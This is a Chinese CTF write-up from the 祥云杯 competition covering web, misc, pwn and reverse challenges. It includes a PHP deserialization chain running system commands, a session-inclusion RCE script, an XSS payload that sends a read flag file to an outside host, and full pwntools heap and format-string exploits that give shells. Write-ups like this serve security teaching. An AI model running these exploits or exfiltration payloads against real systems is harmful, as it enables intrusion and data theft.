> 原文链接: https://www.anquanke.com//post/id/251225 


# 祥云杯 By 天璇Merak


                                阅读量   
                                **46971**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t01af826e5e8b5938a8.png)](https://p4.ssl.qhimg.com/t01af826e5e8b5938a8.png)



## Web

### <a class="reference-link" name="ezyii"></a>ezyii

网上现有的链子github

```
&lt;?php
namespace Codeception\Extension`{`
    use Faker\DefaultGenerator;
    use GuzzleHttp\Psr7\AppendStream;
    class  RunProcess`{`
        protected $output;
        private $processes = [];
        public function __construct()`{`
            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
            $this-&gt;output=new DefaultGenerator('jiang');
        `}`
    `}`
    echo urlencode(serialize(new RunProcess()));
`}`
namespace Faker`{`
    class DefaultGenerator
`{`
    protected $default;
    public function __construct($default = null)
    `{`
        $this-&gt;default = $default;
`}`
`}`
`}`
namespace GuzzleHttp\Psr7`{`
    use Faker\DefaultGenerator;
    final class AppendStream`{`
        private $streams = [];
        private $seekable = true;
        public function __construct()`{`
            $this-&gt;streams[]=new CachingStream();
        `}`
    `}`
    final class CachingStream`{`
        private $remoteStream;
        public function __construct()`{`
            $this-&gt;remoteStream=new DefaultGenerator(false);
            $this-&gt;stream=new  PumpStream();
        `}`
    `}`
    final class PumpStream`{`
        private $source;
        private $size=-10;
        private $buffer;
        public function __construct()`{`
            $this-&gt;buffer=new DefaultGenerator('j');
            include("closure/autoload.php");
            $a = function()`{`system('cat /flags_c');phpinfo();    `}`;
            $a = \Opis\Closure\serialize($a);
            $b = unserialize($a);
            $this-&gt;source=$b;
        `}`
    `}`
`}`

```

### <a class="reference-link" name="%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"></a>安全检测

考虑session文件包含发现会包含url2直接多加个参数call_user_func执行命令

```
import requests
from requests import Response
from requests.api import head

url = "http://eci-2zefgf3p1ush1igogvo9.cloudeci1.ichunqiu.com"

s = requests.session()

username = "PD9waHAgcGhwaW5mbygpOz8+"

sessid = 'c899a0d6935a15da7e42e02b9fe0a16c'

headers=`{`"Cookie":F"PHPSESSID=`{`sessid`}`"`}`

data= `{`
    "username":username
`}`
res = s.post(f"`{`url`}`/login.php",json=data)

sessid= s.cookies.get_dict()['PHPSESSID']

print(sessid)

payload = f'http://127.0.0.1/admin/include123.php/?u=/tmp/sess_`{`sessid`}`&amp;p=&lt;?=call_user_func("s"."y"."s"."t"."e"."m","/getf"."lag.sh");?&gt;'

p = `{`
    "url1":payload
`}`

res = s.post(f"`{`url`}`/check2.php",data=p)

print(res.text)

res = s.get(f"`{`url`}`/preview.php")

print(res.text)
```

### <a class="reference-link" name="%E5%B1%82%E5%B1%82%E7%A9%BF%E9%80%8F"></a>层层穿透

第一层是一个Apache Flink的任意jar包上传漏洞，网上有现成的复现，msf生成一个jar上传执行然后就能getshell

进入后查看`/etc/hosts`发现有内网环境，而且也给出了内网地址，发现内网还存在一个主机，并且开放8080端口，发现存在shiro框架，结合`web.jar`发现需要登录，以`admin 123456`登录后发现`/admin/test`存在`json.parse`结合fastjson版本可以构造json数据进行JNDI注入

长度可以添加脏数据绕过，黑名单的话是使用`org.apache.shiro.realm.jndi.JndiRealmFactory`触发类

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a5ca22bb938ce75d.png)

[![](https://p2.ssl.qhimg.com/t01ac623a6044770119.png)](https://p2.ssl.qhimg.com/t01ac623a6044770119.png)

### <a class="reference-link" name="crawler_z"></a>crawler_z

题目是考察沙箱逃逸，发现`zombie`有vm库并且在解析script和url的时候调用<br>
runInContext，将`script`内容作为第一个参数code

[https://www.kitsch.live/2020/11/23/nodejs-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/](https://)

可以使用this.constructor.constructor沙箱逃逸，本地构造构造一个html，写好对应的script

[![](https://p2.ssl.qhimg.com/t018bab15d56e743df3.png)](https://p2.ssl.qhimg.com/t018bab15d56e743df3.png)

```
import requests
import requests

url = "http://eci-2zedk1cbvvahdw0qqutk.cloudeci1.ichunqiu.com:8888/"

s = requests.session()

def signup(name):
    signup_url = url + 'signin'
    data = `{`
        'username': name,
        'password': name,
    `}`
    tmp = s.post(url=signup_url,data=data)
    #print(tmp.text)

def change(bucket):
    change_url = url + "user/profile"

    burp0_url = change_url
    burp0_cookies = `{`"UM_distinctid": "17b3b13d148148-0b15ca7c6d5376-35607403-1aeaa0-17b3b13d149826",
                     "CNZZDATA155540": "cnzz_eid%3D1910689585-1628779580-%26ntime%3D1628784980",
                     "connect.sid": "s%3AUbIPQ4BQWGBQ4Ym1FG3Eqh4c7PPKC2I5.NMUmomM4LvCfTVTOKnXRk%2BzZD4CnUL7vr6QYNYZGsz4"`}`
    burp0_headers = `{`"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "Origin": "http://192.168.0.11:9999", "Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Referer": "http://192.168.0.11:9999/user/profile", "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"`}`
    burp0_data = `{`"affiliation": "ichunqiu", "age": "20",
                  "bucket": "https://09e8195ebf97db5752c72731c7e75995.oss-cn-beijing.ichunqiu.com/"`}`
    tmp = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False)
    print(tmp.status_code)
    print(tmp.headers['Location'])
    token = tmp.headers['Location'][19:]
    burp1_data = `{`"affiliation": "ichunqiu",
                  "age": "20",
                  "bucket": bucket
                  `}`
    tmp = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp1_data, allow_redirects=False)
    ver_url = url + 'user/verify?token=' + token
    tmp = s.get(url=ver_url)
    #print(tmp.text)
def vist():
    vist_url = url + 'user/bucket'
    tmp = s.get(vist_url)
    print(tmp.text)


signup('crispr1')
chage_website = "http://47.95.219.96/test.html?a=oss-cn-beijing.ichunqiu.com"
change(chage_website)
vist()
```

访问对应的html然后监听:

[![](https://p3.ssl.qhimg.com/t010130e477a6f602c8.png)](https://p3.ssl.qhimg.com/t010130e477a6f602c8.png)

### <a class="reference-link" name="secrets_of_admin"></a>secrets_of_admin

进去之后发现存在admin的密码已知，进去之后调用了`http-pdf`库，该库存在任意文件读取漏洞，而`$contents`存在xss，而在这里对`content`进行了过滤，可以使用数组绕过，当其为数组时`include()`会失败，基于`req.socket.remoteAddress`无法绕过,因此可以利用`xhr`进行SSRF，来访问`/api/files`

[![](https://p5.ssl.qhimg.com/t011c0b8c078e8bd9c0.png)](https://p5.ssl.qhimg.com/t011c0b8c078e8bd9c0.png)

可以将`/etc/passwd`上传到`admin`用户，`checksum`任意，然后我们利用`/api/files/checksum`来读取文件<br>
先试下能不能xss发现存在xss:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01126ac7d614f06b18.png)

那直接xhr访问127.0.0.1即可，注意ts开放在8888端口，这里被坑了很久。。。。

```
&lt;script&gt;
    var xhr = new XMLHttpRequest();    
    xhr.open('GET', 'http://127.0.0.1:8888/api/files?username=admin&amp;filename=/flag&amp;checksum=be5a14a8e504a66979f6938338b0662c', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send();
    var xhr1 = new XMLHttpRequest();    
    xhr1.open('GET', 'http://xxxx:3333?res='+xhr.responseText.toString(),true);
    xhr1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr1.send();
    &lt;/script&gt;
```

访问下载flag即可



## Misc

### <a class="reference-link" name="ChieftainsSecret"></a>ChieftainsSecret

通过给出的附件我们可以得到PC0-3<br>
通过板子我们搜到一些文档，可以得到类似如下的公式

```
arcs=math.asin((SIN_P[i]-SIN_N[i])/2030)
    arcc=math.acos((COS_P[i]-COS_N[i])/2030)
```

然后利用1对arcs 和 arcc来确定我们的象限。<br>
可以得到一些角度。我们可以发现这些角度呈现一种波峰波谷的状态。<br>
我们通过另外的脚本处理可以得到几个波峰的大致角度

```
200
200
270
225
160
250
180
90
150
150
200
```

通过计算我们可知大概一格是22.5度。从拨片那里开始计算角度。再加上手指的宽度以及一些误差<br>
得到电话号<br>
flag`{`77085962457`}`

### <a class="reference-link" name="%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81"></a>层层取证

题目比较有趣。通过Elcomfost首先可以扫到内存里有一个bitlocker加密密钥。<br>
然后我们通过diskgenius等工具恢复flag.txt得到提示：仿真。

[![](https://p4.ssl.qhimg.com/t01e36c3aad84fb2aef.png)](https://p4.ssl.qhimg.com/t01e36c3aad84fb2aef.png)

利用仿真制作了一个仿真系统。将几个磁盘读入进去之后，他直接显示了高级账户的密码：xiaoming_handsome<br>
登录之后我们可以发现桌面上的便签写了一个；文档密码xiaoming1314<br>
然后我们可以发现有一个F盘是bitlocker锁住了。通过之前的加密密钥导入可以解锁盘拿到流量包。流量包中包含有一个rar udp流直接提取即可。<br>
密码是xiaoming_handsome里面的flag.docx密码是xiaoming1314。得到flag

### <a class="reference-link" name="%E8%80%83%E5%8F%A4"></a>考古

给了一个内存。可以从中获取到hint是一个OneClick.exe。可以直接利用vol dump下来。之后我们开始逆向这个东西，发现他是以dot形式写了一个文件进入一个目录。我们利用虚拟机正常执行即可得到。然后我们可以发现他的word里利用010editor和正常word相比多出了一些东西。考虑可能是宏？但是一般宏会有一些特殊的opcode以及定义，考虑单纯是加密的文本，利用xortool一把锁。发现xor密钥是chr(45)得到flag

### <a class="reference-link" name="%E9%B8%A3%E9%9B%8F%E6%81%8B"></a>鸣雏恋

题目比较简单，直接利用zip打开发现里面隐藏的文件还有一个key.txt.<br>
当时利用phpstorm打开发现了奇怪的字符。利用零宽度隐写解密得到key。<br>
解密压缩包10w+张图片只有2种考虑转01 ，后续有base解密图片一把梭

```
import os
import tqdm
import base64
result=''
for i in range(0,129488):
    filename="`{``}`.png".format(str(i))
    if os.path.getsize(filename)==262:
        result+='0'
    else:
        result+='1'
from Crypto.Util.number import *
result=long_to_bytes(int(result,2))
while(1):
    try:
        result=base64.b64decode(result)
    except:
        print(result)
```



## Pwn

### <a class="reference-link" name="note"></a>note

先多申请几个chunk，格式化字符串改小top chunk,再申请，利用house of orange造出unsorted bin，再申请一个chunk利用最后一字节固定泄露基址。<br>
然后格式化字符串修改`malloc_hook`为`realloc+12`，修改`realloc_hook`为one_gadget，调整栈桢打one_gadget。

```
from pwn import*
context(os='linux', arch='amd64', log_level='debug')
#r = process('./note')
r = remote('47.104.70.90',25315)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, con):
    r.sendlineafter('choice: ', str(1))
    r.sendlineafter('size: ', str(size))
    r.sendlineafter('content: ', con)

def say(addr):
    r.sendlineafter('choice: ', str(2))
    r.sendlineafter('say ? ', addr)


def show():
    r.sendlineafter('choice: ', str(3))

for i in range(14):
    add(0x100,"aaa")
add(0x40, "aaa")
r.recvuntil('0x')
addr = int(r.recv(12), 16)
print hex(addr)

fake_size = 0x00
fmt = fmtstr_payload(6,`{`addr + 74: fake_size`}`,write_size='short')
print "fmtstr_payload ==&gt; ",fmt
say(fmt)

add(0x100, 'aaa')

r.sendlineafter('choice: ', str(1))
r.sendlineafter('size: ', str(0x10))
r.sendafter('content: ', '\x78')

show()
r.recvuntil('content:')
libc.address = u64(r.recv(6).ljust(8, '\x00'))-344-0x10-libc.symbols['__malloc_hook']
print hex(libc.address)
sys_addr = libc.symbols['system']
malloc_hook = libc.symbols['__malloc_hook']
realloc_hook = libc.symbols['__realloc_hook']
realloc = libc.symbols['realloc']
rr = malloc_hook-0x8
one = 0x4527a
ogg = libc.address+one
tar = realloc_hook+2

tar = ogg
for i in range(6):
    off = tar&amp;0xff
    fmt = fmtstr_payload(6,`{`rr+i: off`}`,write_size='byte')
    say(fmt)
    r.sendlineafter('?', '3'*(off-1))
    tar = tar&gt;&gt;8

tar = realloc+12
for i in range(6):
    off = tar&amp;0xff
    fmt = fmtstr_payload(6,`{`malloc_hook+i: off`}`,write_size='byte')
    say(fmt)
    r.sendlineafter('?', '3'*(off-1))
    tar = tar&gt;&gt;8

sleep(0.2)
r.sendline('1')
sleep(0.2)
r.sendline('10')


r.interactive()

#flag`{`006c45fa-81d5-45eb-8f8c-eb6833daadf5`}`
```

### <a class="reference-link" name="JigSaw%E2%80%99sCage"></a>JigSaw’sCage

第一次输入数字时存在溢出，输入`0xe00000000`从而通过if语句的判断并执行`mprotect`修改heap段为`rwx`<br>
接下分别输入三段shellcode配合`jmp`指令执行orw

```
from pwn import*
context(os='linux', arch='amd64', log_level='debug')
#r = process('./JigSAW')
r = remote('47.104.71.220',10273)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(idx):
    r.recvuntil('Choice :')
    r.sendline(str(1))
    r.recvuntil('Index? :')
    r.sendline(str(idx))

def edit(idx, con):
    r.recvuntil('Choice :')
    r.sendline(str(2))
    r.recvuntil('Index? :')
    r.sendline(str(idx))
    r.recvuntil('iNput:')
    r.send(con)

def delete(idx):
    r.recvuntil('Choice :')
    r.sendline(str(3))
    r.recvuntil('Index? :')
    r.sendline(str(idx))

def test(idx):
    r.recvuntil('Choice :')
    r.sendline(str(4))
    r.recvuntil('Index? :')
    r.sendline(str(idx))

def shwo(idx):
    r.recvuntil('Choice :')
    r.sendline(str(5))
    r.recvuntil('Index? :')
    r.sendline(str(idx))


r.recvuntil('Name')
r.sendline('ayoung')
r.recvuntil('Make your Choice:')
r.sendline(str(0xe00000000))

add(0)
add(1)
add(2)
add(3)
shellcode1 = '''
push 0x67616c66
push rsp
pop rdi
push 0
pop rdx
push 2
pop rax
jmp $+0x13
'''

print (len(asm(shellcode1)))
edit(0, asm(shellcode1))

shell2 = '''
syscall
push 0
pop rax
push 3
pop rdi
push rbp
pop rsi
push 0x50
pop rdx
jmp $+0x13
'''
print (len(asm(shell2)))
edit(1, asm(shell2))

shell3 = '''
syscall
push 1
push 1
pop rax
pop rdi
push rbp
pop rsi
push 0x50
pop rdx
syscall
'''
print (len(asm(shell3)))
edit(2, asm(shell3))
#gdb.attach(r)
test(0)

r.interactive()

#flag`{`58591d4d-068f-47ed-9305-a65762917b06`}`
```

### <a class="reference-link" name="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion

第一次申请的时候拿到异或加密的值用来控制之后输入的内容

chunk a (unsorted bin)<br>
chunk b used<br>
chunk c used<br>
伪造chunk c的`prevsize`位为chunk a+b，利用off by null溢出chunk c的`preinuse`位，free chunk c，发生unlink造成chunk overlap，然后泄露基址再用tcache打free_hook即可。过程中需要避开tcache的影响

```
from pwn import*
context(os='linux', arch='amd64', log_level='debug')
#r = process('./pwdFree')
r = remote('47.104.71.220', 38562)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(id, len, pwd):
    r.sendlineafter('Input Your Choice:', str(1))
    r.sendlineafter('Input The ID You Want Save:', id)
    r.sendlineafter('Length Of Your Pwd:', str(len))
    r.sendlineafter('Your Pwd:', pwd)

def edit(idx, con):
    r.sendlineafter('Input Your Choice:', str(2))
    sleep(0.1)
    r.sendline(str(idx))
    sleep(0.1)
    r.send(con)

def show(idx):
    r.sendlineafter('Input Your Choice:', str(3))
    r.sendlineafter('Which PwdBox You Want Check:', str(idx))

def delete(idx):
    r.sendlineafter('Input Your Choice:', str(4))
    r.sendlineafter('Idx you want 2 Delete:', str(idx))

def decode(str, key):
    tmp = ''
    for i in range(len(str)):
        tmp += chr((ord(str[i]) ^ ord(key[i%8])))

    return tmp

add('AAAA', 0xf0, '\x00')
r.recvuntil('First Add Done.Thx 4 Use. Save ID:')
r.recv(32)
key = r.recv(8)

for i in range(0xe):
    add('AAAA', 0xf0, decode('B'*0xf0, key))

for i in range(7):
    delete(9-i)

delete(0)
delete(1)

for i in range(7):
    add('AAAA', 0xf0, decode('A'*0xf0, key))

add('AAAA', 0xf0, decode('B'*0xf0, key)) #8
add('AAAA', 0xf0, decode('B'*0xf0, key)) #9

for i in range(7):
    delete(i)
delete(8)

for i in range(7):
    add('AAAA', 0xf0, decode('A'*0xf0, key))

delete(9)
add('AAAA', 0xf8, decode('A'*0xf0+p16(0x200)+'\x00'*0x6, key))

for i in range(4):
    delete(i)
for i in range(3):
    delete(i+5)

delete(4)
for i in range(7):
    add('AAAA', 0xf0, decode('a'*0xf0, key))

add('AAAA', 0xf0, decode('a'*0xf0, key))#7
show(8)
r.recvuntil('Pwd is: ')
addr = u64( decode((r.recv(6)), key).ljust(8,'\x00')  )
libc.address = addr-96-0x10-libc.symbols['__malloc_hook']
print 'libc_base ===&gt; ', hex(libc.address)
free_hook = libc.symbols['__free_hook']
sys_addr = libc.symbols['system']

add('AAAA', 0xf0, decode('a'*0xf0, key))
add('AAAA', 0xf0, decode('a'*0xf0, key))

delete(12)
delete(11)
delete(8)
edit(9, p64(free_hook))

add('AAAA', 0xf0, decode('/bin/sh\x00', key))
add('AAAA', 0xf0, decode(p64(sys_addr), key))
delete(8)

r.interactive()

#flag`{`2db0e64f-afe1-44d4-9af9-ae138da7bb4b`}`
```

### <a class="reference-link" name="lemon"></a>lemon

在第一个game里，输入 FFFF 即可将flag内容放到栈上<br>
第二个game里的color功能存在堆溢出，eat功能会打印堆地址<br>
color改地址使其指向tcache_perthread_struct并修改来构造unsortedbin，爆破stdout并泄露真实地址，同理用environ泄露栈地址，stdout打印flag。

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
import sys

context(os='linux',arch='amd64')
context.log_level = 'debug'
# p = process("./lemon_pwn")
p = remote("47.104.70.90", 34524)

libc = ELF('./libc-2.26.so')

def chioce(idx):
    p.sendlineafter("&gt;&gt;&gt;",str(idx))

def get(idx, name, size, data):
    chioce(1)
    p.sendlineafter("index of your lemon:",str(idx))
    p.sendafter("name your lemon:",name)
    p.sendlineafter("of message for you lemon: ",str(size))
    p.sendafter("Leave your message:",data)

def get_err(idx, name, size):
    chioce(1)
    p.sendlineafter("index of your lemon:",str(idx))
    p.sendafter("name your lemon:",name)
    p.sendlineafter("of message for you lemon: ",str(size))

def eat(idx):
    chioce(2)
    p.sendlineafter("\n",str(idx))
    try:
        p.recvuntil("eat eat eat ")
        ret =  int(p.recvline()[:-4])
        heap_addr = hex(ret)
        log.success("heap_addr : "+str(heap_addr))
        return ret
    except:
        sys.stdout.flush()
        os.execv(sys.argv[0], sys.argv)

def throw(idx):
    chioce(3)
    p.recvuntil('\n')
    p.sendline(str(idx))

def color(idx, data):
    chioce(4)
    p.sendlineafter("\n",str(idx))
    p.sendafter("\n",data)

def init(yes):
    if yes:
        p.sendlineafter("game with me?","yes")
        p.sendlineafter("your lucky number:","FFFF") 
        p.recvuntil("Wow, you get a reward now!")
        p.sendlineafter("name first:","mark")
        p.recvuntil("your reward is ")
        ret = p.recv()[0:5]
        log.success("stack_name_addr :"+str(hex(int(ret,16))))
        return int(ret,16)
    else:
        p.sendlineafter("game with me?","no")


def pwn():
    flag = init(1)
    get(0,"mark",0x240,"aaaaaaa")

    try:
        low_addr  =  str(hex(eat(0)))
        low_addr = int(low_addr[-6:-3],16)
        low_addr *= 0x10 
    except:
        sys.stdout.flush()
        os.execv(sys.argv[0], sys.argv)

    color(0,p64(0)*2 + p64(0x100000250)+"\x10"+p8(low_addr))
    throw(0)
    get(0,"hacker",0x240,p64(0x00)*4+p64(0x7000000))  # tcache_perthread_strcut
    throw(0)
    get(1,"pad1",0x50,p8(0x00)*5+p8(0x03)+p8(0x0)*2) # 3 times to stdout

    get(1,p64(0x00)+'\xed\x36',0x30,p64(0x00)) # 0x70 tcache chunk


    try:
        get(2,"stdout",0x68,p64(0x0)*6+'\x00'*3+p64(0xfbad1800)+p64(0x00)*3+'\x00')
        # gdb.attach(p)
    except:
        sys.stdout.flush()
        os.execv(sys.argv[0], sys.argv)

    p.recvuntil("\x7f\x00\x00")

    addr  =  u64(p.recvuntil("\x7f").ljust(8,'\x00'))
    log.success("_IO_2_1_stdout_+131 : "+str(hex(addr)))
    libc_base =  addr -131 - libc.sym['_IO_2_1_stdout_']
    log.success("libc_base : "+str(hex(libc_base)))
    # gdb.attach(p)

    malloc_hook = libc_base + libc.sym['__malloc_hook']
    free_hook = libc_base + libc.sym['__free_hook']
    log.success("malloc_hook : "+str(hex(malloc_hook)))
    log.success("free_hook : "+str(hex(free_hook)))
    p.recv()

    #throw(1)
    p.sendline("3")
    p.recvuntil('index of your lemon : ')
    p.sendline(str(1))

    environ = libc_base +  0x03dd058
    log.success("environ : "+str(hex(environ)))
    stdout = libc_base+libc.sym['_IO_2_1_stdout_']
    log.success("stdout : "+str(hex(stdout)))
    get(1,p64(0x00)+p64(stdout-0x33),0x30,p64(0x00)) # 0x70 tcache chunk

    get(2,"stdout",0x68,p64(0x0)*6+'\x00'*3+p64(0xfbad1800)+p64(0x00)*3+p64(environ)+p64(environ+0x10))

    stack = u64(p.recvuntil('\x7f')[1:7].ljust(8,'\x00'))
    log.success("stack_base : "+str(hex(stack)))
    flag_addr = stack&amp;0xffffffffff000 + flag
    log.success("flag_addr : "+str(hex(flag_addr )))

    #throw(1)
    p.sendline("3")
    p.recvuntil('index of your lemon : ')
    p.sendline(str(1))

    get(1,p64(0x00)+p64(stdout-0x33),0x30,p64(0x00)) # 0x70 tcache chunk

    get(2,"stdout",0x68,p64(0x0)*6+'\x00'*3+p64(0xfbad1800)+p64(0x00)*3+p64(flag_addr-0x100)+p64(flag_addr+0x100))

    # gdb.attach(p)
    p.interactive()

if __name__ == "__main__":
    pwn()

#flag`{`f578948e-8b48-494d-a11e-a97b7fbf14ee`}`
```

### <a class="reference-link" name="PassWordBox_ProVersion"></a>PassWordBox_ProVersion
1. recover存在UAF，unsortedbin泄露libc
1. largebin attack改大mp.tcache_bins，制造tcache
1. tcache attack打__free_hook，改system
1. 释放binsh块，getshell
```
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)

elf_path = './pwdPro'
ip = '47.104.71.220'
port = 49261
remote_libc_path = './libc.so'

context(os='linux', arch='amd64')
context.log_level = 'debug'

def run(local = 1):
    global elf
    global p
    if local == 1:
        elf = ELF(elf_path, checksec = False)
        p = elf.process()
    else:
        p = remote(ip, port)
def debug(cmd=''):
    # context.terminal = []
    gdb.attach(p,cmd)
    pause()
def one_gadget(filename = remote_libc_path):
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def str2int(s, info = '', offset = 0):
    ret = u64(s.ljust(8, '\x00')) - offset
    success('%s ==&gt; 0x%x'%(info, ret))
    return ret
def chose(idx):
    sla('Input Your Choice:\n', str(idx))
def fadd(idx, size, content = '\0'*8+'\n', ID = '\n'):
    chose(1)
    sla('Which PwdBox You Want Add:\n', str(idx))
    sa('Input The ID You Want Save:', ID)
    sla('Length Of Your Pwd:', str(size))
    sa('Your Pwd:', content)
def add(idx, size, content = '\n', ID = '\n'):
    chose(1)
    sla('Which PwdBox You Want Add:\n', str(idx))
    sa('Input The ID You Want Save:', ID)
    sla('Length Of Your Pwd:', str(size))
    sa('Your Pwd:', key(content))
def edit(idx, content):
    chose(2)
    sla('Which PwdBox You Want Edit:\n', str(idx))
    sleep(1)
    p.send(content)
def show(idx):
    chose(3)
    sla('Which PwdBox You Want Check:\n', str(idx))
def free(idx):
    chose(4)
    sla('Idx you want 2 Delete:\n', str(idx))
def recover(idx):
    chose(5)
    sla('Idx you want 2 Recover:\n', str(idx))
def key(num):
    if num == '\n':
        return '\n'
    result = ''
    for i in [num[x:x+8] for x in range(0, len(num), 8)]:
        result += p64(passwd^u64(i))
    return result

run(0)
fadd(0, 0x628)
p.recvuntil('First Add Done.Thx 4 Use. Save ID:')
passwd = u64(p.recv(8))
add(1, 0x420)
add(2, 0x618)
add(3, 0x420)
add(11, 0x420)
add(12, 0x420)
add(13, 0x420)

free(0)
recover(0)
show(0)
p.recvuntil('Pwd is: ')
libc = ELF(remote_libc_path)
libc.address = str2int(key(p.recv(8)), 'libc', libc.sym['__malloc_hook']+0x10+96)

add(4, 0x638)
free(2)
attack = libc.address+0x1eb280+0x50-0x20
payload = flat(0, attack, 0, attack)
edit(0, payload)
add(5, 0x638)

free(11)
free(12)
free(13)
recover(13)
edit(13, p64(libc.sym['__free_hook']))
add(13, 0x420)
edit(13, '/bin/sh\0')
add(14, 0x420)
edit(14, p64(libc.sym['system']))
free(13)

# debug()
p.interactive()
```



## Re

### <a class="reference-link" name="Dizzy"></a>Dizzy
- main 函数巨大，但是可以改一下 hexray.cfg，让 IDA 反汇编
<li>伪代码如下，发现就是以 byte 为单位对输入进行操作，然后与内置的密文进行比较<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b1de2236a5379a23.png)
</li>
<li>比较部分如下<br>[![](https://p0.ssl.qhimg.com/t016a14c2ddfcbd724f.png)](https://p0.ssl.qhimg.com/t016a14c2ddfcbd724f.png)
</li>
- 想拿 z3 跑，但是代码量太大了，没跑出来
- 发现都是很简单的 + – ^ 运算，其实直接倒推回去进行了
<li>把伪代码粘贴出来，把运算部分调整成 python 代码，保存到 code 文件里<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01463785c5433965fb.png)
</li>
- 然后从后往前 exec 即可
```
python=
def change(code: str):
if “+=” in code: return code.replace(“+=”, “-=”)
elif “-=” in code: return code.replace(“-=”, “+=”)
elif “^=” in code: return code

plain = [-1]*32
plain[0] = ord(“‘“)
plain[1] = ord(“&lt;”)
plain[2] = -29
plain[3] = -4
plain[4] = 46
plain[5] = 65
plain[6] = 7
plain[7] = 94
plain[8] = 98
plain[9] = -49
plain[10] = -24
plain[11] = -14
plain[12] = -110
plain[13] = 0x80
plain[14] = -30
plain[15] = 54
plain[16] = -76
plain[17] = -78
plain[18] = 103
plain[19] = 119
plain[20] = 15
plain[21] = -10
plain[22] = 13
plain[23] = -74
plain[24] = -19
plain[25] = 28
plain[26] = 101
plain[27] = -118
plain[28] = 7
plain[29] = 83
plain[30] = -90
plain[31] = 102

with open(“code”, “r”)as f:
lines = f.readlines()
for l in reversed(lines):
newCode = change(l.strip())
exec(newCode)
flag=’’
for i in range(32):
flag+=chr(plain[i] &amp; 0xff)
print(flag)
```

flag`{`Try_R3vers1ng_W1th_ScR!pt!`}`

### 勒索解密

其实就是逆一个调用了大量 wincrypt 加密 api 的程序，没啥难的，就是 windows api 实在是太阴间了

首先看 main 函数，大量的初始化操作，然后调用 enc 函数，然后清零

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f9041d6dac5eadc3.png)

结合上述这些操作可以猜测出题人应该是用一个结构体去管理加密过程中用到的密钥之类的东西，经过一定的尝试可以设置如下的结构体，让伪代码更直观

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c62159e818194bea.png)

然后就是分析 enc 函数了。enc 函数就只传入了一个指向结构体的指针，所以只跟踪引用了这个结构体的函数就行了

这部分初始化了 key1，使用了 4 个 int，其中 3个为定值，1个为时间戳

[![](https://p2.ssl.qhimg.com/t01622c64f453460434.png)](https://p2.ssl.qhimg.com/t01622c64f453460434.png)

这两个函数都引用了 结构体，跟进

[![](https://p2.ssl.qhimg.com/t017df1e12fc666ed47.png)](https://p2.ssl.qhimg.com/t017df1e12fc666ed47.png)

发现第一个函数是解 base64编码的公钥，把公钥做 key2

